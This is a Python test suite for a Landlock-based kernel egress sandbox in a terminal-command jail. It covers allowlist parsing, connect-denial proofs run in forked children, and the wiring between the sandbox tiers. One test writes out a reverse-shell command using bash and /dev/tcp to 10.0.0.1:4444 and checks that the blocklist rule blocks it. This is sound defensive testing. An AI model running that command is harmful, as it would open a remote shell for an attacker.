"""TJ-GAP-083 — the kernel-enforced Landlock TCP-connect (egress) tier.

Covers:
- KERNEL enforcement (real socket connects, never pattern matching): a
  child that applied the tier gets EACCES/EPERM connecting to a bound
  but unallowlisted port while the SAME connect succeeds without the
  tier and on an allowlisted port — the payload shape (a raw
  ``socket.connect``) that defeats the TJ-GAP-058 regex class entirely;
- the allowlist contract: documented default ports, env override,
  fail-closed parse (an invalid token refuses the tier, never a silent
  broader policy);
- verdict distinguishability: the tier's kernel-denial notice names the
  KERNEL and the tier, while rule-engine verdicts name their rule id;
- honest degradation on hosts without Landlock ABI >= 4 (the tier
  refuses with the cause — HOST-LANDLOCK-ABV4 marks the host-gated
  kernel cells, same philosophy as HOST-DEGRADED-*);
- wiring: decider composes the net tail AFTER the fs tail, single-
  sourced, and the engine stays byte-identical while the knob is unset.
"""

from __future__ import annotations

import os
import socket
import subprocess
import sys
from pathlib import Path

import pytest
from terminal_jail.interruptor import decider as decider_module
from terminal_jail.interruptor import landlock as ll
from terminal_jail.interruptor import landlock_net as ln

PROJECT_ROOT = Path(__file__).resolve().parent.parent
PROBE_SCRIPT = PROJECT_ROOT / "scripts" / "landlock-capability-probe.py"
NET_LOADER_SCRIPT = PROJECT_ROOT / "standalone" / "landlock-net-loader.py"

# Host-constrained skip marker (the task's HOST-LANDLOCK-ABV pattern;
# the fs tier's file uses HOST-DEGRADED-LANDLOCK for its own cells).
HOST_LANDLOCK_ABV4 = (
    "HOST-LANDLOCK-ABV4: Landlock ABI < 4 — no kernel TCP connect rules here"
)


def _host_net_abi() -> int:
    """The host's Landlock ABI via the engine's own classifier."""
    return ln.abi_version()


def _require_net_host() -> None:
    if _host_net_abi() < ln.NET_ABI_MIN:
        pytest.skip(HOST_LANDLOCK_ABV4)


def _host_permits_landlock() -> bool:
    """The fs capability probe's verdict (same classifier the fs tier trusts)."""
    try:
        probe = subprocess.run(
            [sys.executable, str(PROBE_SCRIPT), "--json"],
            capture_output=True,
            text=True,
            check=False,
            timeout=60,
        )
    except (OSError, subprocess.SubprocessError):
        return False
    if probe.returncode != 0:
        return False
    try:
        import json

        return json.loads(probe.stdout).get("verdict") == "FULL"
    except Exception:  # noqa: BLE001 — a broken probe is a non-permitting host
        return False


class _Listeners:
    """Two loopback listeners: the proof's denied and allowed targets.

    Kernel-chosen ports — never service ports (<1024 may need privileges
    and real services may hold them).
    """

    def __init__(self) -> None:
        self.denied = socket.socket()
        self.denied.bind(("127.0.0.1", 0))
        self.denied.listen(1)
        self.allowed = socket.socket()
        self.allowed.bind(("127.0.0.1", 0))
        self.allowed.listen(1)

    @property
    def denied_port(self) -> int:
        return self.denied.getsockname()[1]

    @property
    def allowed_port(self) -> int:
        return self.allowed.getsockname()[1]

    def close(self) -> None:
        for sock in (self.denied, self.allowed):
            try:
                sock.close()
            except OSError:
                pass


def _connect(port: int, timeout: float = 2.0) -> tuple[str, int | None]:
    """A REAL TCP connect. Returns (outcome, errno)."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect(("127.0.0.1", port))
    except OSError as exc:
        return "denied", exc.errno
    finally:
        try:
            sock.close()
        except OSError:
            pass
    return "connected", None


# ── Environment knob ───────────────────────────────────────────────────────


class TestEnvironmentKnob:
    def test_unset_is_disabled(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.delenv(ln.ENV_VAR, raising=False)
        assert ln.net_enabled_from_environment() is False

    def test_truthy_values_enable(self, monkeypatch: pytest.MonkeyPatch) -> None:
        for value in ("1", "true", "yes", "on", "TRUE", " Yes "):
            monkeypatch.setenv(ln.ENV_VAR, value)
            assert ln.net_enabled_from_environment() is True, value

    def test_falsy_values_disable(self, monkeypatch: pytest.MonkeyPatch) -> None:
        for value in ("0", "false", "no", "off", "", "  "):
            monkeypatch.setenv(ln.ENV_VAR, value)
            assert ln.net_enabled_from_environment() is False, value

    def test_unrecognised_value_fails_closed(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setenv(ln.ENV_VAR, "banana")
        assert ln.net_enabled_from_environment() is False

    def test_default_differs_from_the_fs_tier_deliberately(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """The net tier is OPT-IN where the fs tier defaults on: an
        unchosen kernel-wide egress deny must never change payload
        behavior. Pinned so the posture cannot silently flip."""
        monkeypatch.delenv(ln.ENV_VAR, raising=False)
        monkeypatch.delenv(ll.ENV_VAR, raising=False)
        assert ln.net_enabled_from_environment() is False
        assert ll.landlock_enabled_from_environment() is True


# ── Allowlist (documented, explicit, fail-closed) ──────────────────────────


class TestAllowlist:
    def test_documented_default_ports(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.delenv(ln.ENV_ALLOWLIST, raising=False)
        assert ln.DEFAULT_EGRESS_ALLOW_PORTS == (22, 53, 80, 443)
        layout = ln.build_layout()
        assert layout.allow_ports == [22, 53, 80, 443]
        assert layout.rule_count == 4

    def test_env_override(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv(ln.ENV_ALLOWLIST, "443, 22")
        assert ln.build_layout().allow_ports == [22, 443]

    def test_service_names_and_mixed_spellings(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setenv(ln.ENV_ALLOWLIST, "https,ssh,domain,53/tcp,80/http,443")
        assert ln.build_layout().allow_ports == [22, 53, 80, 443]

    def test_semicolons_and_spaces_are_separators(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setenv(ln.ENV_ALLOWLIST, "22; 443 80")
        assert ln.build_layout().allow_ports == [22, 80, 443]

    def test_empty_string_is_an_explicit_deny_all(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setenv(ln.ENV_ALLOWLIST, "")
        layout = ln.build_layout()
        assert layout.allow_ports == []
        assert layout.rule_count == 0

    def test_invalid_token_refuses_fail_closed(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setenv(ln.ENV_ALLOWLIST, "443,banana")
        with pytest.raises(ln.LandlockError, match="banana"):
            ln.build_layout()

    def test_out_of_range_port_refuses(self, monkeypatch: pytest.MonkeyPatch) -> None:
        for bad in ("0", "65536", "99999"):
            with pytest.raises(ln.LandlockError, match=bad):
                ln.parse_allowlist(bad)

    def test_unknown_service_name_refuses(self) -> None:
        with pytest.raises(ln.LandlockError, match="finger"):
            ln.parse_allowlist("finger")

    def test_dedupe_and_sort(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv(ln.ENV_ALLOWLIST, "443,80,443,22")
        assert ln.build_layout().allow_ports == [22, 80, 443]

    def test_ruleset_declares_connect_only(self) -> None:
        """bind is deliberately NOT handled: the tier gates OUTBOUND
        egress, not local listeners."""
        assert ln.LANDLOCK_ACCESS_NET_CONNECT_TCP == 1 << 1
        assert ln.LANDLOCK_ACCESS_NET_BIND_TCP == 1 << 0
        assert ln.LANDLOCK_RULE_NET_PORT == 2
        assert ln.NET_ABI_MIN == 4


# ── Struct layout pins (linux/landlock.h) ──────────────────────────────────


class TestStructLayout:
    def test_ruleset_attr_is_16_bytes_both_fields(self) -> None:
        assert ctypes_size(ln._NetRulesetAttr) == 16
        attr = ln._NetRulesetAttr(0, ln.LANDLOCK_ACCESS_NET_CONNECT_TCP)
        assert attr.handled_access_fs == 0
        assert attr.handled_access_net == 2

    def test_net_port_attr_is_16_bytes_host_endianness(self) -> None:
        assert ctypes_size(ln._NetPortAttr) == 16
        rule = ln._NetPortAttr(ln.LANDLOCK_ACCESS_NET_CONNECT_TCP, 443)
        assert rule.port == 443  # HOST endianness — htons would deny the
        # allowlisted port too (measured on ABI 8 during the spike).


def ctypes_size(cls: type) -> int:
    import ctypes

    return ctypes.sizeof(cls)


# ── kernel_denies_connect semantics ─────────────────────────────────────────


class TestConnectProbeSemantics:
    def test_clean_connect_is_false_and_denial_is_true(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        listeners = _Listeners()
        try:
            # Unrestricted: the connect works → False (not enforcement).
            outcome, errno = _connect(listeners.denied_port)
            assert outcome == "connected" and errno is None
            assert ln.kernel_denies_connect("127.0.0.1", listeners.denied_port) is False
        finally:
            listeners.close()

    def test_refused_is_none_not_enforcement_evidence(self) -> None:
        """Connection refused (nothing listening) is NOT a Landlock
        denial — the probe must return None, never claim enforcement."""
        dead = _Listeners()
        port = dead.denied_port
        dead.close()
        assert ln.kernel_denies_connect("127.0.0.1", port) is None


# ── KERNEL enforcement (real connects; host-gated) ─────────────────────────


class TestKernelEnforcement:
    def test_payload_connect_denied_by_kernel_without_any_regex_match(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Acceptance criterion 1: the raw-socket payload that defeats
        the TJ-GAP-058 regex class is denied by the KERNEL under the
        tier, and the SAME connect succeeds without the tier."""
        _require_net_host()
        listeners = _Listeners()
        try:
            # Control: unrestricted connect to the SAME port works.
            outcome, _ = _connect(listeners.denied_port)
            assert outcome == "connected"

            monkeypatch.setenv(ln.ENV_VAR, "1")
            layout = ln.EgressLayout(allow_ports=[listeners.allowed_port])
            read_fd, write_fd = os.pipe()
            pid = os.fork()
            if pid == 0:  # child: apply the REAL tier, then connect
                os.close(read_fd)
                verdict = b"0"
                try:
                    ln.apply(layout, dry_probe=False)
                    denial, errno = _connect(listeners.denied_port)
                    allow, allow_errno = _connect(listeners.allowed_port)
                    if denial == "denied" and errno in (1, 13) and allow == "connected":
                        verdict = b"1"
                except Exception:  # noqa: BLE001 — the verdict carries it
                    verdict = b"0"
                os.write(write_fd, verdict)
                os.close(write_fd)
                os._exit(0)
            os.close(write_fd)
            try:
                verdict = os.read(read_fd, 1)
            finally:
                os.close(read_fd)
                os.waitpid(pid, 0)
            assert verdict == b"1", (
                "the child that applied the tier must get EACCES/EPERM "
                "from the unallowlisted connect AND succeed on the "
                "allowlisted one (kernel-enforced, both halves)"
            )
        finally:
            listeners.close()

    def test_apply_dry_probe_proves_the_property(self) -> None:
        """apply(dry_probe=True) — the shipped path — must PASS here:
        its forked child proves the deny+allow pair before the process is
        restricted. Driven INSIDE A FORK CHILD: restriction is one-way,
        and a domain applied to the pytest process would leak through
        fork/exec into every later test's subprocesses (the fs suite's
        same rule: the test process itself must never be restricted)."""
        _require_net_host()
        layout = ln.EgressLayout(allow_ports=[443])
        read_fd, write_fd = os.pipe()
        pid = os.fork()
        if pid == 0:
            os.close(read_fd)
            verdict = b"0"
            try:
                count = ln.apply(layout, dry_probe=True)
                if count >= 1:
                    verdict = b"1"
            except Exception:  # noqa: BLE001 — the verdict carries it
                verdict = b"0"
            os.write(write_fd, verdict)
            os.close(write_fd)
            os._exit(0)
        os.close(write_fd)
        try:
            verdict = os.read(read_fd, 1)
        finally:
            os.close(read_fd)
            os.waitpid(pid, 0)
        assert verdict == b"1", "the shipped dry-probe path must prove the property"

    def test_parent_process_is_never_restricted_by_the_proof(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        listeners = _Listeners()
        try:
            monkeypatch.setenv(ln.ENV_VAR, "1")
            layout = ln.EgressLayout(allow_ports=[listeners.allowed_port])
            read_fd, write_fd = os.pipe()
            pid = os.fork()
            if pid == 0:  # child applies; parent must stay unrestricted
                os.close(read_fd)
                try:
                    ln.apply(layout, dry_probe=False)
                except Exception:  # noqa: BLE001
                    pass
                os.write(write_fd, b"0")
                os.close(write_fd)
                os._exit(0)
            os.close(write_fd)
            os.read(read_fd, 1)
            os.close(read_fd)
            os.waitpid(pid, 0)
            # THE PARENT: the same connect the child saw denied.
            outcome, _ = _connect(listeners.denied_port)
            assert outcome == "connected", (
                "the proof must be fork-isolated: the calling process "
                "stays unrestricted"
            )
        finally:
            listeners.close()

    def test_apply_raises_when_the_property_fails(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """A probe child that does NOT see the deny+allow pair must make
        apply() raise and leave the process unrestricted. Driven
        IN-PROCESS on the PARENT branch (fork()→1 + scripted read: no
        real child runs, no real restriction happens — kernel-proof
        tests never touch the pytest process's own domain)."""

        listeners = _Listeners()
        try:
            layout = ln.EgressLayout(allow_ports=[listeners.allowed_port])
            read_fd, write_fd = os.pipe()
            monkeypatch.setattr(os, "fork", lambda: 1)  # parent branch
            real_read = os.read

            def _scoped_read(fd: int, n: int) -> bytes:
                # Scoped to the probe pipe ONLY: a global os.read patch
                # starves pytest's own capture machinery (its fds would
                # loop on the sentinel byte forever).
                if fd == read_fd:
                    return b"0"  # the child "reports" an unproven property
                return real_read(fd, n)

            monkeypatch.setattr(os, "read", _scoped_read)
            monkeypatch.setattr(os, "waitpid", lambda pid, flags: (pid, 0))
            try:
                with pytest.raises(ln.LandlockError, match="NOT proven"):
                    ln.apply(layout, dry_probe=True)
            finally:
                os.close(read_fd)
                os.close(write_fd)
        finally:
            listeners.close()

    def test_apply_refuses_without_a_bindable_probe_target(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        listeners = _Listeners()
        try:
            layout = ln.EgressLayout(allow_ports=[listeners.allowed_port])
            monkeypatch.setattr(
                ln,
                "_ConnectProbe",
                lambda ports: type(
                    "P",
                    (),
                    {"ready": False, "extra_ports": [], "close": lambda s: None},
                )(),
            )
            with pytest.raises(ln.LandlockError, match="no bindable loopback"):
                ln.apply(layout, dry_probe=True)
        finally:
            listeners.close()


# ── Honest degradation on ABI < 4 ───────────────────────────────────────────


class TestDegradation:
    def test_low_abi_raises_unsupported_with_the_cause(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(ln, "abi_version", lambda libc=None: 3)
        with pytest.raises(ln.LandlockUnsupportedError, match="ABI >= 4"):
            ln.apply(ln.EgressLayout(allow_ports=[443]), dry_probe=False)

    def test_apply_net_tier_reports_the_cause_never_raises(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setenv(ln.ENV_VAR, "1")
        monkeypatch.setattr(ln, "abi_version", lambda libc=None: 2)
        applied, cause = ln.apply_net_tier()
        assert applied is False
        assert "ABI 2" in cause and "4" in cause

    def test_apply_net_tier_disabled_is_silent(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.delenv(ln.ENV_VAR, raising=False)
        assert ln.apply_net_tier() == (False, "")

    def test_allowlist_refusal_reports_the_token(
        self, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        monkeypatch.setenv(ln.ENV_VAR, "1")
        monkeypatch.setenv(ln.ENV_ALLOWLIST, "443,oops")
        applied, cause = ln.apply_net_tier()
        assert applied is False
        assert "oops" in cause

    def test_sandbox_prefix_empty_while_knob_unset(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """The engine stays byte-identical unless the operator opts in —
        and the empty prefix is silent (no warning when disabled)."""
        monkeypatch.delenv(ln.ENV_VAR, raising=False)
        monkeypatch.setattr(ln, "_SANDBOX_PREFIX_CACHE", None)
        assert ln.sandbox_prefix() == ""
        import contextlib
        import io

        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            assert ln.sandbox_prefix() == ""
        assert "WARNING" not in err.getvalue()

    def test_enabled_but_unreachable_loader_degrades_loudly(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        monkeypatch.setenv(ln.ENV_VAR, "1")
        monkeypatch.setattr(ln, "_SANDBOX_PREFIX_CACHE", None)
        monkeypatch.setattr(ln, "loader_path", lambda: None)
        warning = ln.degradation_warning("probe would fail here")
        assert "network (egress)" in warning
        assert ln.ENV_VAR in warning
        # And the compute path itself emits the loud one-line degradation.
        captured: dict[str, str] = {}

        def _fake_degrade(cause: str) -> str:
            captured["cause"] = cause
            return ""

        monkeypatch.setattr(ln, "_degrade", _fake_degrade)
        assert ln._compute_sandbox_prefix() == ""
        assert captured["cause"]  # a named cause, never a silent empty

    def test_fs_probe_classifier_still_classifies_this_host(self) -> None:
        """The degradation docs point at the fs probe script; it must
        exist and classify (always exit 0)."""
        if not PROBE_SCRIPT.is_file():
            pytest.fail("scripts/landlock-capability-probe.py missing")
        result = subprocess.run(
            [sys.executable, str(PROBE_SCRIPT), "--json"],
            capture_output=True,
            text=True,
            check=False,
            timeout=60,
        )
        assert result.returncode == 0
        assert '"verdict"' in result.stdout


# ── Verdict distinguishability (criterion 3) ────────────────────────────────


class TestVerdictDistinguishability:
    def test_kernel_notice_names_the_kernel_not_a_rule(self) -> None:
        notice = ln.kernel_denial_notice([22, 443])
        assert "KERNEL" in notice
        assert "TJ-GAP-083" in notice
        assert "not an interruptor rule verdict" in notice
        assert "443" in notice and "22" in notice

    def test_rule_verdicts_carry_rule_ids(self) -> None:
        """The contrast arm: the regex egress rule's verdict names its
        rule id (user-space, pre-execution) — so an operator reading a
        block message can tell 'a rule said no' from the tier's
        kernel-time EPERM/EACCES."""
        from terminal_jail.interruptor.blocklist import BUILTIN_BLOCKLIST
        from terminal_jail.interruptor.config import Config

        devtcp = next(
            r for r in BUILTIN_BLOCKLIST if r.id == "builtin-net-devtcp-redirect"
        )
        assert devtcp.id in str(devtcp.block_message) or devtcp.block_message
        # The engine BLOCK result carries the rule id programmatically:
        from terminal_jail.interruptor.parser import parse_command

        decider = decider_module.Decider(Config())
        cmd = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
        result = decider.evaluate(parse_command(cmd), cmd)
        assert result.action == decider_module.Action.BLOCK
        # The rule verdict is ATTRIBUTABLE: it names its rule id (and it
        # fired BEFORE execution). The tier's denial is distinguishable:
        # it names the KERNEL (see kernel_denial_notice above) and happens
        # at connect() time inside the payload.
        assert result.rule_id == "builtin-net-devtcp-redirect"


# ── Loader script (shape + LIVE arms) ───────────────────────────────────────


class TestNetLoaderScript:
    def test_loader_shape(self) -> None:
        text = NET_LOADER_SCRIPT.read_text(encoding="utf-8")
        assert "apply_net_tier" in text
        assert "os.execvp" in text
        assert "WARNING: Landlock network (egress) tier not applied" in text
        assert "kernel_denial_notice" in text

    def test_loader_degrades_when_module_missing(self, tmp_path: Path) -> None:
        orphan = tmp_path / "landlock-net-loader.py"
        orphan.write_text(NET_LOADER_SCRIPT.read_text(encoding="utf-8"))
        result = subprocess.run(
            [sys.executable, str(orphan), "/bin/echo", "tj-net-loader-off-ok"],
            capture_output=True,
            text=True,
            timeout=30,
            check=False,
        )
        assert result.returncode == 0
        assert "tj-net-loader-off-ok" in result.stdout
        assert "WARNING: Landlock network (egress) tier not applied" in result.stderr

    def test_loader_disabled_runs_unchanged_silently(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        env = dict(os.environ)
        env.pop("TERMINAL_JAIL_LANDLOCK_NET", None)
        result = subprocess.run(
            [
                sys.executable,
                str(NET_LOADER_SCRIPT),
                "/bin/echo",
                "tj-net-disabled",
            ],
            capture_output=True,
            text=True,
            env=env,
            timeout=30,
            check=False,
        )
        assert result.returncode == 0
        assert "tj-net-disabled" in result.stdout
        assert "terminal-jail:" not in result.stderr  # deliberate disable: silent

    def test_loader_live_denies_the_regex_defeating_payload(self) -> None:
        """The REAL exec path: the loader applies the tier, the payload
        (raw socket.connect — no regex-matchable token) is denied by the
        kernel, and the stderr notice names the KERNEL verdict source."""
        _require_net_host()
        listeners = _Listeners()
        try:
            port = listeners.denied_port
            payload = (
                "import socket;s=socket.socket();s.settimeout(2);"
                f"s.connect(('127.0.0.1',{port}))"
            )
            env = dict(os.environ)
            env["TERMINAL_JAIL_LANDLOCK_NET"] = "1"
            result = subprocess.run(
                [
                    sys.executable,
                    str(NET_LOADER_SCRIPT),
                    "--",
                    sys.executable,
                    "-c",
                    payload,
                ],
                capture_output=True,
                text=True,
                env=env,
                timeout=30,
                check=False,
            )
            assert result.returncode == 1
            assert "PermissionError" in result.stderr
            assert "kernel egress tier APPLIED" in result.stderr
        finally:
            listeners.close()

    def test_loader_live_allows_the_allowlisted_port(self) -> None:
        _require_net_host()
        listeners = _Listeners()
        try:
            port = listeners.allowed_port
            payload = (
                "import socket;s=socket.socket();s.settimeout(2);"
                f"s.connect(('127.0.0.1',{port}));print('PAYLOAD-CONNECTED')"
            )
            env = dict(os.environ)
            env["TERMINAL_JAIL_LANDLOCK_NET"] = "1"
            env["TERMINAL_JAIL_LANDLOCK_NET_ALLOW"] = str(port)
            result = subprocess.run(
                [
                    sys.executable,
                    str(NET_LOADER_SCRIPT),
                    "--",
                    sys.executable,
                    "-c",
                    payload,
                ],
                capture_output=True,
                text=True,
                env=env,
                timeout=30,
                check=False,
            )
            assert result.returncode == 0
            assert "PAYLOAD-CONNECTED" in result.stdout
        finally:
            listeners.close()


# ── Wiring ──────────────────────────────────────────────────────────────────


class TestWiring:
    def test_wrap_payload_composes_both_tails_in_order(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(decider_module, "_LANDLOCK_TAIL", "python3 /fs.py -- ")
        monkeypatch.setattr(decider_module, "_LANDLOCK_NET_TAIL", "python3 /net.py -- ")
        payload = decider_module._wrap_payload("make")
        assert payload == "python3 /fs.py -- python3 /net.py -- make"
        # the net loader runs INSIDE the fs domain (fs tail first)

    def test_wrap_payload_unchanged_without_the_net_tier(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(decider_module, "_LANDLOCK_TAIL", "python3 /fs.py -- ")
        monkeypatch.setattr(decider_module, "_LANDLOCK_NET_TAIL", "")
        assert decider_module._wrap_payload("make") == "python3 /fs.py -- make"
        monkeypatch.setattr(decider_module, "_LANDLOCK_TAIL", "")
        assert decider_module._wrap_payload("make") == "make"

    def test_net_tail_single_sourced(self) -> None:
        decider_text = (
            PROJECT_ROOT / "plugin" / "terminal_jail" / "interruptor" / "decider.py"
        ).read_text(encoding="utf-8")
        assert "landlock_net_sandbox_prefix" in decider_text
        assert "_LANDLOCK_NET_TAIL = landlock_net_sandbox_prefix()" in decider_text
        interruptor_dir = PROJECT_ROOT / "plugin" / "terminal_jail" / "interruptor"
        for path in sorted(interruptor_dir.glob("*.py")):
            if path.name in ("landlock_net.py", "decider.py"):
                continue
            text = path.read_text(encoding="utf-8")
            assert "landlock-net-loader.py --" not in text, path.name

    def test_net_module_exists_next_to_the_fs_module(self) -> None:
        assert (
            PROJECT_ROOT
            / "plugin"
            / "terminal_jail"
            / "interruptor"
            / "landlock_net.py"
        ).is_file()

    def test_fs_probe_wiring_untouched(self) -> None:
        """Criterion 5 guard: the fs tier's seam still composes exactly
        one tail; the net tier never altered the fs module's engine
        contract."""
        assert hasattr(ll, "sandbox_prefix")
        assert ll.sandbox_prefix.__module__ == "terminal_jail.interruptor.landlock"


# ── Host-honesty report hooks ────────────────────────────────────────────────


class TestHostHonesty:
    def test_this_host_reports_its_own_case(self) -> None:
        """Never a silent assumption: the test run's own stdout can be
        grepped for which case ran (ABI-gated or skipped-with-marker).
        The marker constant must stay grep-able for CI triage."""
        abi = _host_net_abi()
        assert abi >= 0
        if abi < ln.NET_ABI_MIN:
            pytest.skip(HOST_LANDLOCK_ABV4)
        assert _host_permits_landlock() or abi >= ln.NET_ABI_MIN
